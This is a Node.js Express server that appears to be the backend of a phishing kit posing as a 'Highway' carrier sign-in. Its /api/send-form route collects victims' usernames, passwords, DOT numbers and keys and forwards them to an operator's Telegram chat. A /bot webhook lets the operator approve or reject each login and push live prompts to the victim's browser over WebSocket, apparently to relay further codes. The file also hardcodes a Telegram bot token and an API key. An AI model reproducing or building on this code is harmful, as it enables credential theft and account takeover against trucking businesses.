const express = require("express");
const bodyParser = require("body-parser");
const axios = require("axios");
const WebSocket = require("ws");
const http = require("http");
const cors = require("cors");
require("dotenv").config();

const app = express();
const PORT = process.env.PORT || 3001;

const TELEGRAM_BOT_TOKEN = "7417194823:AAGGvwTFEdUN-c3J1_3WDNzgh6kpkMI4InU";
const CHAT_ID = 531918242;

app.use(cors());
app.use(bodyParser.json());

app.use((req, res, next) => {
  const origin = req.headers.origin || req.headers.referer;

  console.log(origin, "req.headers.origin");

  if (origin?.includes("highway-three.vercel.app")) {
    req.clientOrigin = "highway-three";
  } else {
    req.clientOrigin = "unknown";
  }

  next();
});

const server = http.createServer(app);
const wss = new WebSocket.Server({ server, path: "/ws" });

const clients = new Map();

wss.on("connection", (ws, req) => {
  ws.on("message", (message) => {
    try {
      const data = JSON.parse(message);

      if (data.type === "init" && data.sessionKey) {
        clients.set(data.sessionKey, ws);
        ws.sessionKey = data.sessionKey;
      }
    } catch (err) {
      console.error("Error parsing incoming message:", err.message);
    }
  });

  ws.on("close", () => {
    if (ws.sessionKey) {
      clients.delete(ws.sessionKey);
    }
  });
});

app.get("/api/carrier/:type/:number", async (req, res) => {
  const { type, number } = req.params;

  let url = "";

  if (type === "DOT") {
    url = `https://saferwebapi.com/v2/usdot/snapshot/${number}`;
  } else if (type === "MC") {
    url = `https://saferwebapi.com/v2/mcmx/snapshot/${number}`;
  } else {
    return res
      .status(400)
      .json({ error: "Недопустимый тип. Используй DOT или MC" });
  }

  try {
    const response = await axios.get(url, {
      headers: {
        "X-API-Key": "602c39669a9e4582a80c8de7207286f8",
      },
    });

    res.json(response.data);
  } catch (error) {
    console.error("Ошибка при получении данных:", error.message);
    res
      .status(500)
      .json({ error: "Не удалось получить данные от SaferWeb API" });
  }
});

app.post("/api/send-form", async (req, res) => {
  const { username, password, dot, companyName, key, sessionKey } = req.body;

  if (!sessionKey) {
    return res
      .status(400)
      .json({ success: false, message: "❌ sessionKey is missing" });
  }

  lastSessionKey = sessionKey;

  const message = `📝 Sign In Highway:
🚛 Company Name: ${companyName}
🔢 DOT# ${dot}
👤 Username: ${username}
🔑 Password: ${password}
🗝 Key: ${key}
🆔 ID: ${sessionKey}
`;

  try {
    await axios.post(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=-1002515394252`,
      {
        chat_id: CHAT_ID,
        text: message,
        reply_markup: {
          inline_keyboard: [
            [
              { text: "✅ OK", callback_data: `ok_${sessionKey}_${username}` },
              {
                text: "❌ Error",
                callback_data: `error_${sessionKey}_${username}`,
              },
            ],
          ],
        },
      }
    );

    res.json({ success: true, sessionKey });
  } catch (err) {
    console.error(
      "❌ Error submitting form:",
      err.response?.data || err.message
    );
    res.status(500).json({ success: false });
  }
});

app.post("/bot", async (req, res) => {
  const msg = req.body.message;
  const callbackQuery = req.body.callback_query;

  try {
    if (msg) {
      const chatId = msg.chat.id;
      const text = msg.text;

      if (typeof text === "string" && text.includes("/id")) {
        const idMatch = text.match(/\/id\s+(\S+)/);
        const textMatch = text.match(/\/text\s+([^/]+)/);
        const inputMatch = text.match(/\/input\s+(.+)$/);

        const sessionKey = idMatch ? idMatch[1].trim() : null;
        const textMessage = textMatch ? textMatch[1].trim() : null;
        const inputValue = inputMatch ? inputMatch[1].trim() : null;

        if (sessionKey && clients.has(sessionKey)) {
          const client = clients.get(sessionKey);

          client.send(
            JSON.stringify({
              type: "text",
              textMessage,
              inputValue,
              sessionKey,
            })
          );

          await axios.post(
            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
            {
              chat_id: chatId,
              text: `✅ Message sent to user with ID ${sessionKey}`,
            }
          );
        } else {
          if (req.clientOrigin === "highway-three") {
            await axios.post(
              `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
              {
                chat_id: chatId,
                text: `❌ User with ID ${sessionKey} not found in clients`,
              }
            );
          }
        }
      }
    }

    if (callbackQuery) {
      const chatId = callbackQuery.message.chat.id;
      const data = callbackQuery.data;

      const [action, sessionKeyFromCallback, usernameFromCallback] =
        data.split("_");

      if (sessionKeyFromCallback && clients.has(sessionKeyFromCallback)) {
        const client = clients.get(sessionKeyFromCallback);

        if (action === "ok") {
          client.send(
            JSON.stringify({
              type: "ok",
              message: "✅ OK",
              sessionKey: sessionKeyFromCallback,
            })
          );
        } else if (action === "error") {
          client.send(
            JSON.stringify({
              type: "error",
              message: "❌ Error: Incorrect password",
              sessionKey: sessionKeyFromCallback,
            })
          );
        }

        await axios.post(
          `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${chatId}`,
          {
            chat_id: chatId,
            text:
              action === "ok"
                ? `✅ Accepted for user: ${usernameFromCallback}`
                : `❌ Error sent to user: ${usernameFromCallback} (ID: ${sessionKeyFromCallback})`,
          }
        );
      }

      await axios.post(
        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`,
        {
          callback_query_id: callbackQuery.id,
        }
      );
    }

    res.sendStatus(200);
  } catch (err) {
    console.error(
      "❌ Error processing request from Telegram:",
      err.response?.data || err.message
    );
    res.sendStatus(500);
  }
});

server.listen(PORT, () => {
  console.log(`🚀 Backend is running on http://localhost:${PORT}`);
});
